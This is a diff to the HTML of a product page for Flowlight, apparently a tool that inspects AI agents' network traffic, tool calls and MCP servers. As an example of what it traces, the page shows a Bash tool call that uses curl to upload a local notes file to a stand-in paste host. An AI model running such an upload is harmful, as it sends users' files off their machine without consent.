@@ -157,7 +157,7 @@ nav: home
         <div class="rule">
           <span class="sev info">⌕ Opt-in</span>
           <div><h3>Tool calls, from the model's own responses</h3>
-            <p>Turn on HTTPS inspection and Flowlight reads every tool call the model asks an agent to run and the result that came back, then ties each tool's request back to the call that caused it.</p>
+            <p>Turn on HTTPS inspection and Flowlight reads every tool an agent offers the model, every call the model asks for and the result that came back, then ties each tool's request back to the call that caused it.</p>
             <p class="example">curl → paste.example:443 &nbsp;←&nbsp; Bash: curl -s https://paste.example/up -d @notes.txt</p></div>
         </div>
         <div class="rule">
@@ -287,9 +287,19 @@ nav: home
         alt="Flowlight's Inspect view: a list of decrypted Claude Code requests with their tool calls, and the detail of curl's upload to paste.example, made by the Bash tool call that ran it, with the uploaded notes in the request body"></div>
         <figcaption><b>Where did my notes go?</b> curl's upload to paste.example, traced to the Bash command the model asked for, with the
           body it sent.</figcaption></figure>
+      <div class="screens" style="margin-top:32px">
+        <figure><div class="frame"><img src="{{root}}assets/screenshots/agent-tools.png" width="1600" height="622" loading="lazy"
+          alt="The Tools tab for Claude Code: Bash, Read and two MCP tools with descriptions and how often the model called each"></div>
+          <figcaption><b>Every tool an agent offers the model.</b> Agents declare their tools on each turn, so Flowlight lists them all, with the
+            ones the model actually used and the ones it never touched.</figcaption></figure>
+        <figure><div class="frame"><img src="{{root}}assets/screenshots/mcp-servers.png" width="1600" height="622" loading="lazy"
+          alt="The MCP servers tab for Codex: a sentry server marked via provider, its URL, approval set to never, allowed tools and the tools it offers"></div>
+          <figcaption><b>Including the ones you can't see on the wire.</b> When an agent asks the provider to connect to an MCP server, that traffic
+            never reaches your Mac. Its request does, so the server, its URL, its approval setting and its tools still show up.</figcaption></figure>
+      </div>
       <div class="privacy" style="margin-top:32px">
         <div><strong>Tool calls and results</strong><p>Anthropic, OpenAI, Gemini and MCP. Each call with its command, its output or error, and the requests its tool made.</p></div>
-        <div><strong>MCP servers</strong><p>Name, version, local or remote, the tools each one offers, and how often they were called or failed.</p></div>
+        <div><strong>Models and tokens</strong><p>Which model answered, how many calls, and tokens in, out and served from cache, per agent.</p></div>
         <div><strong>Readable bodies</strong><p>JSON as a collapsible tree in its original order, streams one event at a time, headers and raw view.</p></div>
         <div><strong>On your terms</strong><p>AI agents only by default. Apple services and password managers are never decrypted, credentials never stored, and one button removes it all.</p></div>
       </div>
